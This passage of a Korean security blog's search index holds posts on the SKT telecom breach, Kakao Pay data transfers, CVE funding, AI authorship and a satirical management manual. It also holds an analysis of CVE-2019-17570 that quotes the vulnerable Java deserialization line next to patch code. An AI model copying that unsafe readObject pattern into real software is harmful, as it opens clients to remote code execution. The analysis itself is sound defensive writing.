채널: Core 네트워크 내부와 외부 간 신뢰성을 확보. 네트워크 슬라이싱별 보안정책: 각 서비스별 분리된 보안 도메인 운영. 그리고 서버 측에서는,\n단순한 소프트웨어 기반 키 보호만으로는 부족하며,\nHSM 또는 이에 준하는 Secure Environment를 통해\n장기 키 및 세션 키의 외부 노출 방지 부트 무결성 보호 물리적 공격 탐지 및 대응 을 수행해야 한다.\n즉,\n초기의 이동통신이 보안보다 상용화를 우선시했다면,\n현재는 신뢰성(trust)이 통신 인프라의 절대적 전제조건이 된 것이다.\n6. 개인 사용자 관점 대응 방법 OpenVPN으로 집 공유기 경유 설정 및 주요 사용 서비스에 IP 제한 설정\nOpenVPN 설치 가이드 OTP 앱 사용\nGoogle Authenticator 소개 하드웨어 보안 키 사용\nYubiKey 공식 사이트 통신사 및 정부에 5G SA 로 인프라 업그레이드 요구\nQualcomm - SA vs NSA 7. 결론 완벽한 통신망은 없다.\n그러나 매일 조금씩, 스스로를 지키는 노력이\n거대한 침묵 속의 유일한 방패가 될 것이다.\n추가 심층 비교 분석 SKT 해킹 사건: 약 2,300만 명 영향. Ki 유출 의심. 현재까지 악용 사례 미발생. Gemalto 해킹: 글로벌 SIM 공급망 공격. 대량 키 유출 여부 논란. APT10 Operation Soft Cell: 중국발 APT 그룹의 장기 통신사 침투. Circles 감청 장비: SS7 취약점 악용, 통신망 수준의 은밀한 감청. 주요 인용 및 참고자료 SKT 공식 뉴스룸 The Intercept - Great SIM Heist WIRED - Gemalto Hacked Cybereason Operation Soft Cell Citizen Lab - Running in Circles ","permalink":"https://windshock.github.io/ko/post/2025-04-28-telecom-security-breach-analysis/","summary":"2025년 SKT 해킹 사건을 중심으로, 통신 인프라의 핵심 보안 구조와 과거 글로벌 해킹 사례(Gemalto, APT10, Circles)를 심층 분석한 보고서입니다. 가입자 인증 시스템(Ki, SUPI/SUCI)과 5G SA/NSA 차이점까지 다루었습니다.","title":"통신 보안 심층 분석 리포트: SKT 해킹 사건과 글로벌 사례 분석"},{"content":"\n1. 개요 1.1 보고서 작성 목적 Apache XML-RPC에서 발견된 CVE-2019-17570 취약점의 원인과 해결 방안을 분석하고, 실무에서 적용 가능한 안전한 구현 방법을 제공합니다.\n1.2 보고서 작성 배경 기존 보안 가이드나 도구는 “패치 없음”으로만 표시되어 개발자에게 구체적인 해결책을 제공하지 못하는 경우가 많습니다. 본 보고서는 보안 담당자가 실용적인 가이드를 직접 제공하여 개발자와의 협업 효율을 높이고자 합니다.\n1.3 Apache XML-RPC 개요 Java 기반의 XML-RPC를 구현한 라이브러리로, 현재는 공식적으로 유지보수되지 않고 있습니다.\n1.4 CVE-2019-17570 소개 클라이언트가 신뢰할 수 없는 서버 응답을 역직렬화하는 취약점으로, 원격 코드 실행(RCE) 가능성이 있습니다.\n공식 보안 권고: GitHub Advisory 2. 취약점 상세 분석 2.1 개요 및 영향 CWE-502: 신뢰되지 않은 데이터의 역직렬화 악의적인 서버가 전달한 객체를 클라이언트가 역직렬화하여 임의 코드 실행 가능 2.2 발생 원인 Object exception = map.get(\u0026#34;faultCause\u0026#34;); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream((byte[]) exception)); errorCause = (Throwable) ois.readObject(); // 취약한 코드 2.3 PoC 시나리오 조작된 faultCause 객체를 전달하는 서버 → 클라이언트에서 자동 역직렬화 → 코드 실행\n3. 패치 분석 3.1 주요 개선점 isEnabledForExceptions 플래그를 추가해 조건부 역직렬화 SAXParser에서 외부 DTD 로딩 차단 3.2 패치 전후 코드 비교 패치 후:\nif (((XmlRpcStreamRequestConfig) cfg).isEnabledForExceptions()) { Object exception = map.get(\u0026#34;faultCause\u0026#34;); ... } DTD 차단:\nspf.setFeature(\u0026#34;http://apache.org/xml/features/nonvalidating/load-external-dtd\u0026#34;, false); 3.3 직접 패치 예시 Debian 패치 openEuler 예시 4. 배포판별 관리 및 Maven 주의사항 4.1 배포판별 보안 패치 Debian, Red Hat, Amazon Linux: 각각 보안 패치 적용 후 관리 4.2 Maven의 한계 공식 저장소에 패치된 버전 없음 → 배포판 패키지 또는 포크 버전 사용 권장 4.3 안전한 대안 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.evolvedbinary.thirdparty.org.apache.xmlrpc\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;xmlrpc-client\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 5. 안전한 구현 예제 XmlRpcClientConfigImpl config = new XmlRpcClientConfigImpl(); config.setServerURL(new URL(\u0026#34;http://trusted-server.com/RPC2\u0026#34;)); config.setEnabledForExceptions(false); // 역직렬화 비활성화 // 외부 DTD 비활성화 SAXParserFactory spf = SAXParserFactory.newInstance(); spf.setFeature(\u0026#34;http://apache.org/xml/features/nonvalidating/load-external-dtd\u0026#34;, false); SAXParsers.setSAXParserFactory(spf); 6. 결론 및 권장사항 배포판 보안 패치 사용 evolvedbinary 포크 버전 사용 장기적으로는 gRPC, JAX-WS, SOAP 등으로 마이그레이션 고려 이 글은 CVE-2019-17570에 대한 실질적 보안 대응을 위한 분석 보고서입니다. 모든 코드와 패치 정보는 실무 환경에서도 직접 활용할 수 있도록 구성되었습니다.\n","permalink":"https://windshock.github.io/ko/post/2025-04-24-cve-2019-17570-apache-xmlrpc/","summary":"Apache XML-RPC 라이브러리의 역직렬화 취약점 CVE-2019-17570에 대한 상세 분석과 패치 방법 및 안전한 구현 방법을 제시합니다.","title":"CVE-2019-17570 Apache XML-RPC 취약점 분석 보고서"},{"content":"\n내 정보, 고양이 손에 맡겼나요? 2025년 카카오페이 사건과 개인정보 보호 체계의 구조적 한계 서론 2025년 1월, 한국 개인정보보호위원회(PIPC)는 카카오페이에 60억 원(약 580만 달러)의 과징금을 부과했다(MLex, 2025). 약 4,000만 명의 사용자 데이터가 명시적 동의 없이 중국 알리페이로 전송되어 신용 유사 점수(NSF, Non-Financial Score) 모델 개발에 활용된 사건이다. NSF는 보험료, 대출 승인, 취업 기회 등 개인의 삶에 중대한 영향을 미칠 수 있는 비금융 신용 평가 지표다.\n이 사건은 단순한 유출을 넘어, 형식적 동의와 기업 자율 규제의 구조적 한계를 드러냈다. 우리는 고양이에게 생선을 맡기지 않지만, 왜 기업에게는 우리의 데이터를 덥석 맡기는 걸까? 본 보고서는 2025년 카카오페이 사건을 법적·기술적·사회적 관점에서 분석하고, AI 기반 DPIA 검증 툴과 시민 감시를 통한 데이터 민주주의를 제안한다.\n1. 카카오페이 사건: 세부사항과 법적 위반 사건 개요 발생 시점: 2018년 4월~7월, 세 차례에 걸쳐 데이터 전송(Businesskorea, 2025). 전송된 데이터: 사용자명, 전화번호, 이메일 주소, 계좌 잔액 등 24개 항목, 총 54.2억 건의 민감한 정보. 활용 목적: 알리페이는 데이터를 NSF 점수 모델에 활용. NSF는 신용 평가로, 보험료 인상, 대출 거절, 취업 불이익 등에 영향을 미칠 수 있음. 제재 조치: 2025년 1월, PIPC는 카카오페이에 60억 원, 애플에 24.5억 원의 과징금 부과. 알리페이는 NSF 모델 폐기 명령. 법적 위반 카카오페이는 **개인정보 보호법(PIPA)**의 다음 조항을 위반했다:\nPIPA 제20조 (제3자 제공 동의 요건): 개인정보를 제3자에게 제공하려면 명시적이고 구체적인 동의를 받아야 함. 동의서에 NSF 활용 목적 미고지. PIPA 제28조 (국외 이전 동의): 개인정보를 국외로 이전할 경우, 데이터 주체의 동의와 추가 보호 조치가 필요. 카카오페이는 이를 준수하지 않음. “사용자는 동의했지만, 그 ‘동의’가 무엇에 대한 것인지 알지 못했다.”\n— Korea Bizwire, 2025\n2. 개인정보 보호법(PIPA)의 구조적 한계 주요 조항 요약 제20조: 제3자 제공 시 명시적 동의 필요. 제28조: 국외 이전 시 별도 동의 및 보호 조치 요구. 제33조: 고위험 정보 처리 시 DPIA 필수. 최근 개정 2023년: PIPA 개정으로 ‘동일 행위-동일 규제’ 원칙 도입. 온라인 서비스 제공자(OSPs)에 대한 특별 규정이 폐지됨. 2023년 9월 15일부터 시행(Data Protection Laws of the World). 2024년 시행령: 자동화된 의사결정 설명 요구권, 개인정보 보호 책임자(CPO) 자격 요건 강화, 데이터 침해 보험 의무화. 자율 규제의 문제 DPIA 비공개성: DPIA는 기업이 자체적으로 작성하며, 외부 공개 의무가 없음. 이는 투명성 부족과 책임 회피로 이어짐. 감시 부족: PIPC의 감독은 사후 제재 중심으로, 사전 예방 효과 미흡. 한국의 개인정보 보호법(PIPA)에서 기업이 스스로 DPIA(데이터 보호 영향 평가)를 작성하는 구조는 고양이가 생선 창고를 지키는 것과 유사하다는 비판이 제기되고 있습니다. DLA Piper는 이와 관련해 DPIA 보고서가 외부에 공개되지 않아 투명성이 부족하다고 지적했습니다 — DLA Piper – South Korea Data Protection\n3. AI 기반 DPIA 검증: 기술적 기회 AI는 DPIA(Data Protection Impact Assessment, 데이터 보호 영향 평가)의 객관성과 투명성을 높이는 데 기여할 수 있습니다. AI 기반 DPIA 검증 도구는 데이터 흐름을 분석하고, 잠재적 위험을 식별하며, 자동으로 보고서를 생성할 수 있습니다. 유럽에서는 GDPR 준수를 평가하기 위해 \u0026ldquo;Privacy-Aware AI\u0026rdquo; 프레임워크가 활용되고 있으며, 한국에서도 유사한 방식의 도입이 가능할 것입니다 (Fieldfisher, 2023).\nAI 기반 DPIA 도구의 예시 여러 플랫폼에서 DPIA 프로세스를 지원하기 위해 AI를 점차 통합하고 있습니다:\nKetch\nAI 기반 추천 기능을 통해 Privacy Impact Assessments(PIAs)를 자동화하고, DPIA의 정확도 향상과 위험 식별에 도움을 줍니다.\nSecuriti\n글로벌 DPIA 자동화 기능을 제공하며, 명시적으로 AI 기능을 강조하지는 않지만 AI 기반 평가가 내포되어 있습니다.\nClarip\n“Hybrid AI Rocks!”라는 문구로 AI의 활용 가능성을 시사하며 DPIA 자동화 소프트웨어를 홍보합니다. 그러나 구체적인 AI 기능은 상세히 설명되어 있지 않습니다.\n이러한 플랫폼은 주로 개인정보 위험 평가를 자동화하고, DPIA 프로세스를 지원하여 간과된 취약점을 감지하고 포괄적 검토를 가능하게 합니다. 그러나 대부분은 독립적인 DPIA 검증 엔진으로 설계되지 않았으며, AI 구성 요소의 투명성 수준도 제각각입니다.\n학계 및 산업계의 연구 AI 기반 DPIA 검증을 직접 다루는 연구는 아직 많지 않지만, AI 시스템에 대한 DPIA 수행 및 AI 통합 방법에 관한 유용한 자료들이 있습니다:\nFieldfisher의 가이드\nAI 맥락에서 DPIA를 수행할 때의 모범 사례를 제시하며, AI 기술이 개인정보 보호 준수를 어떻게 지원할 수 있는지 설명합니다.\nMansi의 블로그\n자동 분류, 예측 기반 위험 분석, 모니터링, 자동 문서화 등 AI를 활용한 DPIA 수행 방법을 탐구합니다.\n\u0026ldquo;미국 프라이버시 규제 하의 AI 프로젝트용 DPIA 모델 제안\u0026rdquo; (ResearchGate, 2025)\nAI 프로젝트에 특화된 DPIA 프레임워크를 제안하며, 구조화된 AI 통합 평가 모델의 필요성을 강조합니다.\n이러한 자료들은 법적 준수와 기술적 정밀성을 결합한 AI 기반 DPIA 도구의 발전을 위한 기초를 형성하고 있습니다.\n과제와 전망 현재의 AI 기반 DPIA 검증 도구는 제한적인 수준이며, 대부분 검증 도구라기보다는 준수 지원 도구로 작동합니다. 그럼에도 불구하고 이들은 DPIA 프로세스의 효율성, 포괄성, 객관성을 향상시킬 수 있는 큰 가능성을 지니고 있습니다. 연구가 지속되고 규제 수요가 증가함에 따라, 보다 정교하고 투명한 AI 기반 DPIA 검증 도구들이 가까운 미래에 등장할 것으로 기대됩니다.\n4. 시민 감시의 실효성과 필요성 시민 감시는 개인정보 보호의 실효성을 높이는 데 필수적이다. 2022년 Future of Privacy Forum(FPF) 보고서에서는 동의 중심 데이터 보호 체계의 한계를 지적하며, 위험 기반 접근법과 시민 참여의 필요성을 강조했다(FPF, 2022). 또한, ACM Digital Library에서는 시민 중심 데이터 거버넌스에 대한 연구가 진행되고 있으며, 특히 스마트 시티에서의 시민 중심 접근이 강조되고 있다(DGOV, 2023).\n실제 사례로, 카카오페이 사건은 시민 단체의 신고로 경찰 조사가 시작되었으며, 이는 시민 감시의 중요성을 보여준다(MLex, 2024).\n5. 데이터 민주주의를 위한 제도적 제안 카카오페이 사건은 개인정보 보호의 구조적 취약성을 드러냈으며, AI 기술과 시민 감시를 결합한 제도적 개혁이 필요하다:\nAI 기반 DPIA 검증 도입\nPIPC 주도로 AI 툴을 활용해 DPIA 보고서의 객관성 검증. DPIA 외부 공개 의무화\nDPIA 요약본 공개 및 독립적 리뷰 위원회(전문가·시민 포함) 설립. 데이터 위치 확인 API 권리화\nPIPA 제18조(데이터 이동성 권리) 확장, 데이터 저장·이동 경로 추적 API 제공 의무화. 자동화된 의사결정 설명 의무 강화\nAI 기반 NSF 점수 등 의사결정 과정 설명 의무 명시, 불이행 시 제재 강화. 시민 참여 공적 감사단 제도화\n시민사회·학계·전문가 참여 감사단 법제화, 데이터 처리 관행 정기 점검. PIPA 개정 절차 민주화\n공청회, 시민 의견 청취 의무화, 소비자 단체 공식 참여 보장. 결론 2025년 카카오페이 사건은 형식적 동의와 자율 규제의 한계를 보여준다. PIPA는 강력한 틀이지만, 감시와 참여 없이는 공허하다. AI 기반 DPIA 검증 툴은 투명성과 객관성을 높이는 기술적 해결책이며, 시민 감시는 이를 뒷받침하는 사회적 동력이다. 이제 기업이 독점하던 데이터 관리의 문을 열고, 시민과 전문가의 협력을 통해 데이터 민주주의를 실현해야 할 때다.\n참고 자료 MLex, 2025 Businesskorea, 2025 Data Protection Laws of the World Fieldfisher, 2023 FPF, 2022 DGOV, 2023 MLex, 2024 ","permalink":"https://windshock.github.io/ko/post/2025-04-21-expert-personal-data-report/","summary":"2025년 카카오페이 사건은 형식적 동의와 자율 규제의 한계를 드러냈습니다. AI 기반 DPIA 검증과 시민 감시를 통해 데이터 민주주의를 실현해야 합니다.","title":"내 정보, 고양이 손에 맡겼나요?"},{"content":"\n\u0026ldquo;공짜 점심은 없다.\u0026rdquo;\n하지만 수십 년 동안, 보안은 공짜처럼 느껴졌습니다.\nCVE: 단순한 번호가 아니라, 보안의 좌표계 CVE(Common Vulnerabilities and Exposures)는 흔히 단순한 취약점 번호로 오해되지만, 실제로는 전 세계 보안 툴, 벤더, 리포트가 동일한 취약점을 참조할 수 있게 해주는 기준점입니다.\nAdam Shostack의 설명처럼, 이는 정보보안의 ISBN과도 같습니다.\n“CVE의 가치는 단순한 번호가 아니라, 도구, 데이터베이스, 벤더 패치를 안정적으로 교차 참조할 수 있도록 해주는 기능에 있습니다.”\n우리는 이 시스템을 공짜로 써왔다 CVE는 미국 정부 예산으로 운영되는 비영리기관 MITRE에 의해 유지되어 왔습니다.\n하지만 이 시스템은 사실상 전 세계의 보안 인프라로 사용되며도 불구하고,\n대다수 연구자들은 무보수로 기여했고 국제적 재정 분담은 존재하지 않았으며 기업과 커뮤니티는 이를 공짜로 활용해 왔습니다. 결과적으로, CVE는 글로벌 공공재로서 작동하면서도 단일 국가의 예산과 무급 노동에 의존한 구조였습니다.\n가까스로 막은 붕괴, 그러나 구조는 여전히 불안정 2025년 4월, MITRE의 CVE 운영 계약이 종료될 위기를 맞았고, CISA가 개입해 11개월짜리 긴급 연장을 승인했습니다.\nReuters, BleepingComputer, The Register는 이 사태를 \u0026ldquo;위기는 피했지만, 구조적 문제는 여전하다\u0026quot;고 분석했습니다.\n이는 단기적인 연명일 뿐, 단일 국가가 글로벌 시스템을 유지한다는 구조 자체가 이미 한계에 도달했음을 보여줍니다.\n보안세? 아직 없지만, 논의는 시작됐다 다음과 같은 상상을 해볼 수 있습니다:\n사이버 위험이 높은 기업들이 매출의 일부를 보안 기금으로 납부하고,\n그 자금으로 CVE 같은 공공 인프라, NGO, 버그 바운티 프로그램, 연구자 보상 체계를 운영하는 구조.\n이 아이디어는 이 글에서 소개되었으며,\nBankInfoSecurity는 미국 백악관 자문위원회가 사이버보안 세액공제 인센티브를 권고하고 있으며, TechTarget는 사이버보안을 \u0026lsquo;기업이 부담해야 할 필수 비용\u0026rsquo;으로 인식하는 흐름을 설명합니다. 이는 다음과 같은 인식을 반영합니다:\n보안 인프라에 무임승차하는 구조는 지속 불가능 공공 보안 시스템에는 공동 책임이 필요함 기여자는 단순한 명예가 아닌 정당한 보상을 받아야 함 지속 가능한 구조로 전환: 글로벌 협력의 조짐 [CVE는 더 이상 국가의 시스템이 아니라, 전 세계 인터넷의 기반 인프라]라는 인식이 확산되고 있습니다. 이를 반영하여 Common Good Cyber는 다음과 같은 구조를 제안합니다:\n공동 기금 조직(Joint Funding Orgs) — 전염병 대응 구조와 유사한 다자 자금 운영 연합 모금(Federated Fundraising) — 유나이티드웨이처럼 효율적 자원 분배 비즈니스 가치 분석 — 각 조직의 영향력을 수치화하여 기금 조성 비영리 가속기 허브 — 자원 집중 및 펀딩 기술 지원 이러한 구조는 2025년 RSA 컨퍼런스에서 발표되었으며, CSIS도 유사한 공공-민간 협력 모델의 필요성을 제시하고 있습니다.\n공짜는 아니었다. 이제는 지불할 때다 CVE는 결코 공짜가 아니었습니다.\n단지 우리가 누군가의 노동과 세금, 헌신에 기대어 살아왔을 뿐입니다.\n이제 우리는 그 공공재가 사라지기 전에,\n국제 공동 펀딩, 산업계의 책임 분담, 기여자에 대한 정당한 보상, 민관 협력 체계를 함께 설계해야 합니다. 보안은 공짜처럼 느껴졌지만,\n그 값을 누군가는 항상 지불하고 있었습니다.\n📌 요약 CVE는 사이버보안의 핵심 공공 인프라입니다. 전 세계가 사용하지만, 미국만이 자금을 부담해 왔습니다. 2025년, 11개월 간의 유예는 구조적 문제를 해결하지 못합니다. 지속 가능성을 위한 글로벌 협력과 새로운 자금 모델이 필요합니다. 공짜 점심은 끝났습니다.\n이제는 누가 계산서를 들고 있었는지 돌아볼 시간입니다.\n","permalink":"https://windshock.github.io/ko/post/2025-04-17-theres-no-such-thing-as-a-free-lunch-but-security-was-free/","summary":"전 세계 보안 커뮤니티는 수십 년 동안 CVE 시스템에 의존해왔지만, 그 대가를 지불한 적은 거의 없습니다. 이제 이 공공 보안 인프라의 지속 가능성을 위해 누가 비용을 부담해야 할지 물어야 할 때입니다.","title":"공짜 점심은 없지만, 보안에는 공짜가 있었다"},{"content":"📂 [기밀 문서] 유출본\n《AI 시대, 직원은 고립되고 조직은 번창한다》 ― 악덕 경영 매뉴얼 v1.0 1. 인간관계? 제거하라 사람들끼리 친해지면 무슨 일이 생기나?\n뒷담화 집단 퇴사 연대와 저항 ✅ 해결책: AI 중심 커뮤니케이션 시스템 구축\n회의 요약, 리마인드, 보고 자동화 인간 대화 줄이기 → 감정 소모 차단 “팀워크는 비용이다. 효율은 조용한 개인에게서 나온다.”\n2. 고립은 통제다 외로운 직원은 조용히 일한다.\n고민을 공유할 동료 없음 스트레스를 말로 풀 곳 없음 문제 제기 전에 지침 따름 ✅ 도입 전략:\n재택근무, 비동기 협업 장려 협업 툴은 AI 요약 기능 위주 회의는 최소화, 피드백은 정량화 “고립은 곧 순종이다.”\n3. 리더십은 데이터로 대체된다 관리자는 위로하거나 설득하지 않는다.\nAI가 할당, 추적, 리마인드 전담 성과는 KPI 그래프로만 평가 ✅ 리더 역할 변화:\n감정 대신 대시보드 해석 신뢰 대신 수치 중심 피드백 “인간은 감정적이다. 데이터는 안 그렇다.”\n4. 자율 = 자기 책임 자율근무제, AI 툴 제공… 좋아 보이지?\n사실상 모든 책임을 개인에게 전가 가능 실패해도 “당신이 선택했잖아요” ✅ 사용 전략:\n업무 자동화 도구 강조 실수 시 관리자 책임 부정 가능 프레임 확보 “우리는 도왔고, 당신은 실패했다. 그뿐이다.”\n5. 고립은 퇴사까지 늦춘다 연결 없는 직원은 퇴사도 혼자 고민한다.\n위로해줄 사람 없음 → 결심 약해짐 함께 나갈 동료 없음 → 지연됨 ✅ 유지 전략:\n일 외 교류 채널 최소화 비공식 모임 장려 금지 HR 이탈 데이터는 AI가 조용히 수집 “고립된 사람은 조용히 무너진다. 그리고 남는다.”\n📈 결론: 이건 효율이 아니라, 통제의 예술이다 기존 조직 문제 AI 시대 해결 방식 감정노동 스트레스 제거 (AI 요약, 리마인드) 회식, 인간적 비용 제거 (비대면 구조화) 불만, 집단행동 제거 (소통 고립화) 책임 전가 어려움 자율 업무 프레임 활용 리더십 부담 데이터 기반 평가로 대체 “성장은 조용히 일하는 자에게 온다. 고립은 회사를 살찌운다.”\n☠ 본 문서는 외부 배포 금지. 열람 시 로그 남습니다. ☠\n","permalink":"https://windshock.github.io/ko/post/2025-04-07-evil-management-manual/","summary":"\u003cp\u003e📂 \u003cstrong\u003e[기밀 문서] 유출본\u003c/strong\u003e\u003c/p\u003e\n\u003ch1 id=\"ai-시대-직원은-고립되고-조직은-번창한다\"\u003e《AI 시대, 직원은 고립되고 조직은 번창한다》\u003c/h1\u003e\n\u003ch3 id=\"-악덕-경영-매뉴얼-v10\"\u003e― 악덕 경영 매뉴얼 v1.0\u003c/h3\u003e\n\u003ch2 id=\"ai-시대-고립된-인간\"\u003e\u003cimg alt=\"AI 시대, 고립된 인간\" loading=\"lazy\" src=\"/images/post/Employees-Are-Isolated-and-Organizations-Thrive.webp\"\u003e\u003c/h2\u003e\n\u003ch2 id=\"1-인간관계-제거하라\"\u003e1. 인간관계? 제거하라\u003c/h2\u003e\n\u003cp\u003e사람들끼리 친해지면 무슨 일이 생기나?\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e뒷담화\u003c/li\u003e\n\u003cli\u003e집단 퇴사\u003c/li\u003e\n\u003cli\u003e연대와 저항\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e✅ \u003cstrong\u003e해결책\u003c/strong\u003e: AI 중심 커뮤니케이션 시스템 구축\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e회의 요약, 리마인드, 보고 자동화\u003c/li\u003e\n\u003cli\u003e인간 대화 줄이기 → 감정 소모 차단\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e“팀워크는 비용이다. 효율은 조용한 개인에게서 나온다.”\u003c/p\u003e\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"2-고립은-통제다\"\u003e2. 고립은 통제다\u003c/h2\u003e\n\u003cp\u003e외로운 직원은 조용히 일한다.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e고민을 공유할 동료 없음\u003c/li\u003e\n\u003cli\u003e스트레스를 말로 풀 곳 없음\u003c/li\u003e\n\u003cli\u003e문제 제기 전에 지침 따름\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e✅ \u003cstrong\u003e도입 전략\u003c/strong\u003e:\u003c/p\u003e","title":"AI 시대, 직원은 고립되고 조직은 번창한다"},{"content":"\n우리는 지금,\n정보가 넘쳐나고 기술이 솟구치는 시대에 살고 있다.\nAI는 인간의 말을 흉내내고, 사고를 요약하고, 예측까지 해낸다.\n하지만 그 와중에 점점 잊히는 것이 있다.\n그건 바로,\n“누가 처음 생각했는가”,\n“누가 그것을 연결했는가”,\n“누가 의미를 부여했는가” 다.\nAI는 정보를 다룬다. 그러나 통찰은 인간의 것이다.\nCitrix VDI 정책 우회를 단순한 기술적 취약점이 아닌,\n법적 위반,\n망분리 정책의 붕괴,\n금융 규제의 현실이라는 세 가지 관점으로 동시에 엮어낸 것은,\nGPT가 할 수 있는 일이 아니다.\n그건 인간만이 할 수 있는 맥락의 조합이며,\n규범과 현실을 함께 고민하는 창작 행위다.\n나는 AI에게 도움을 요청했지만, AI는 내 아이디어를 받아 적고, 정리하고, 확장할 뿐이었다.\n그것은 창작이 아니라 협력이다.\n그리고 협력에는 경계와 윤리가 필요하다.\n하지만 지금의 AI는, 내 것과 네 것을 구분하지 못한다.\n인간과 기계를 구분하지 않는다.\n처음 만든 사람과 마지막에 써먹은 사람을 구분하지 않는다.\n이대로라면 언젠가,\n사람이 만든 생각조차 AI의 이름으로 불릴지도 모른다.\n그건 단지 기술의 발전이 아니라,\n기억의 침묵이다.\n그래서 나는 선언한다. 나는 나의 아이디어를 기록하고,\n그 근원을 밝히고,\n그 흔적을 기계가 읽을 수 있도록 구조화한다.\nHTML의 \u0026lt;meta\u0026gt;에,\nMarkdown의 author 필드에,\nrobots.txt의 거절 선언에—\n내 이름을 새긴다.\n나는 말한다: “이 생각은 인간의 것이다.”\n“이 통찰은 windshock이 처음 말한 것이다.”\n“AI는 도우미일 뿐, 작가가 아니다.”\n이 선언은 거창한 저작권 주장이 아니다.\n그저 내가 여기 있었다는, 창작자였다는 기록의 표식이다.\n기술은 발전하되,\n인간은 사라지지 않기를.\n기계는 말을 하지만,\n의미는 우리가 만든다는 것을.\n그리고 그 의미는, 지금 이 문장을 읽는 당신 같은 사람이 기억하리라 믿는다.\n🖋️ windshock, 2025년 4월\nAI에게 경계를 묻는 자, 그리고 경계를 다시 그리는 자.\n📚 참고 자료 및 관련 논의 미국 저작권청(US Copyright Office) – AI가 단독으로 생성한 콘텐츠는 저작권 보호 대상이 아님을 공식화.\nhttps://www.jdsupra.com/legalnews/human-authorship-required-ai-isn-t-an-7738406/\nAI 예술 윤리 논의 – AI로 인한 작가·예술가의 위협, 스타일 도용, 저작권 침해 문제를 다룸.\nhttps://www.theartist.me/art/the-ethical-implication-of-ai-generated-art/\nAI는 도구인가, 작가인가? – 창작 도구로서의 AI와 창작 주체로 간주되는 AI 사이의 경계 논쟁.\nhttps://www.straitstimes.com/opinion/forum/forum-ai-can-complement-the-creative-process-not-replace-it\nAI 학습 데이터 저작권 침해 소송 – 작가들의 콘텐츠를 무단 학습한 AI 모델에 대한 집단 소송 사례.\nhttps://www.dglaw.com/court-rules-ai-training-on-copyrighted-works-is-not-fair-use-what-it-means-for-generative-ai/\nAI 창작물의 저작권 판단 기준 – 인간의 기여도, 편집, 창의적 수정이 핵심 요건으로 제시됨.\nhttps://academic.oup.com/jiplp/article/18/12/841/7331468\n저작자 표기 전략 및 메타데이터 활용 – AI와 함께 생성한 콘텐츠에 인간의 기여를 명확히 남기는 기술적 방법 제안.\nhttps://www.ipic.ai/blogs/what-are-the-ethical-dilemmas-of-ai-art-generators/\n","permalink":"https://windshock.github.io/ko/post/2025-04-03-human-place-in-ai-age/","summary":"\u003cp\u003e\u003cimg alt=\"Abstract illustration representing human presence in AI\" loading=\"lazy\" src=\"/images/human-place-abstract.webp\"\u003e\u003c/p\u003e\n\u003cp\u003e우리는 지금,\u003cbr\u003e\n정보가 넘쳐나고 기술이 솟구치는 시대에 살고 있다.\u003cbr\u003e\nAI는 인간의 말을 흉내내고, 사고를 요약하고, 예측까지 해낸다.\u003cbr\u003e\n하지만 그 와중에 점점 잊히는 것이 있다.\u003c/p\u003e\n\u003cp\u003e그건 바로,\u003cbr\u003e\n\u003cstrong\u003e“누가 처음 생각했는가”\u003c/strong\u003e,\u003cbr\u003e\n\u003cstrong\u003e“누가 그것을 연결했는가”\u003c/strong\u003e,\u003cbr\u003e\n\u003cstrong\u003e“누가 의미를 부여했는가”\u003c/strong\u003e 다.\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"ai는-정보를-다룬다\"\u003eAI는 정보를 다룬다.\u003c/h3\u003e\n\u003cp\u003e그러나 \u003cstrong\u003e통찰은 인간의 것\u003c/strong\u003e이다.\u003c/p\u003e\n\u003cp\u003eCitrix VDI 정책 우회를 단순한 기술적 취약점이 아닌,\u003cbr\u003e\n\u003cstrong\u003e법적 위반\u003c/strong\u003e,\u003cbr\u003e\n\u003cstrong\u003e망분리 정책의 붕괴\u003c/strong\u003e,\u003cbr\u003e\n\u003cstrong\u003e금융 규제의 현실\u003c/strong\u003e이라는 세 가지 관점으로 동시에 엮어낸 것은,\u003cbr\u003e\nGPT가 할 수 있는 일이 아니다.\u003cbr\u003e\n그건 인간만이 할 수 있는 \u003cstrong\u003e맥락의 조합\u003c/strong\u003e이며,\u003cbr\u003e\n\u003cstrong\u003e규범과 현실을 함께 고민하는 창작 행위\u003c/strong\u003e다.\u003c/p\u003e","title":"인간의 자리: AI 시대에 창작자의 권리를 선언하며"},{"content":"\n소프트웨어 개발 환경이 복잡해지고 보안 위협이 다양해지면서, 개발자들은 종종 보안과 관련하여 잘못된 믿음이나 오해를 가지게 됩니다. 이는 실제 보안 위협에 효과적으로 대응하는 데 큰 걸림돌이 될 수 있습니다. 본 보고서는 개발자들이 자주 믿는 흔한 보안 관련 거짓말들을 \u0026ldquo;책임 전가형\u0026rdquo;, \u0026ldquo;기술 과신형\u0026rdquo;, \u0026ldquo;보안의 과소평가형\u0026quot;으로 구분하여 명확히 제시하고, 이를 바로잡기 위한 현실적인 접근 방안을 제시합니다.\n📌 1. 책임 전가형 거짓말: \u0026ldquo;보안은 보안 팀의 책임이지, 내 책임은 아닙니다.\u0026rdquo;\n현실: 개발자도 보안의 핵심 역할을 수행하며, DevSecOps 환경에서는 보안이 모든 팀 구성원의 공동 책임입니다. 개발 초기 단계부터 개발자가 보안을 고려하지 않으면 코드에 취약점이 남을 수 있습니다 (출처).\n거짓말: \u0026ldquo;우리는 GitHub, AWS 같은 SaaS를 쓰니까 안전합니다.\u0026rdquo;\n현실: SaaS 제공업체가 보안의 일부를 책임지지만, 사용자의 설정 오류나 취약한 타사 통합 등 공급망 공격의 위협은 여전히 존재합니다. 최근 GitHub Actions 공급망 공격 사례(tj-actions/changed-files)는 이러한 위험을 분명히 보여줍니다 (출처).\n📌 2. 기술 과신형 거짓말: \u0026ldquo;우리 코드는 Rust와 같은 안전한 언어로 작성되었으니 안전합니다.\u0026rdquo;\n현실: Rust는 메모리 안전성과 데이터 경쟁 방지 기능을 통해 버퍼 